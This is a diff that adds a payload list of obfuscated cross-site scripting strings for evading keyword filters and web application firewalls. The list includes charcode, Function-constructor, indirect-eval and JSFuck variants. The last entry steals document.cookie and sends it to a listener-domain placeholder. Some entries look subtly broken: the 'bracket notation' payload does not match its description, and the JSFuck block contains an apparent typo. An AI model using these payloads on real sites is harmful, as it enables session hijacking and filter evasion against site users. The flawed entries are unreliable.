@@ -1,0 +1,52 @@
+# XSS Obfuscation Payloads
+
+# Purpose:
+# These payloads use JavaScript obfuscation techniques to bypass
+# keyword-based filters and weak WAF protections.
+
+----------------------------------------
+1. CharCode Encoding
+Payload: <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+Description: Builds "alert(1)" using character codes.
+Use Case: Bypass filters blocking keywords like "alert".
+
+----------------------------------------
+2. Function Constructor
+Payload: <img src=x onerror=Function("ale"+"rt(1)")()>
+Description: Uses Function constructor with string concatenation.
+Use Case: Avoid direct keyword detection.
+
+----------------------------------------
+3. Bracket Notation
+Payload: <img src=x onerror=this>
+Description: Accesses function using bracket notation.
+Use Case: Bypass filters blocking direct function calls.
+
+----------------------------------------
+4. Indirect eval
+Payload: <script>(0,eval)('alert(1)')</script>
+Description: Calls eval indirectly.
+Use Case: Bypass filters targeting direct eval() usage.
+
+----------------------------------------
+5. JSFuck Obfuscation
+Payload:
+<script>
+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!++[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]])()
+</script>
+Description: Fully obfuscated JavaScript using JSFuck.
+Use Case: Extreme filter bypass and WAF evasion.
+
+----------------------------------------
+6. Concatenated JavaScript URI
+Payload: <input onfocus=location='jav'+'ascript:ale'+'rt(1)' autofocus>
+Description: Breaks "javascript:alert" into parts.
+Use Case: Bypass keyword-based blocking.
+
+----------------------------------------
+7. Stealth Exfiltration (Obfuscated)
+Payload: <svg/onload=try{window.x?0:!function(){var x=new XMLHttpRequest;x.open('GET','//your-listener-domain/?c='+document.cookie),x.send()}()}catch(e){}>
+Description: Obfuscated data exfiltration using XMLHttpRequest.
+Use Case: Blind XSS with stealth execution.
+
+----------------------------------------
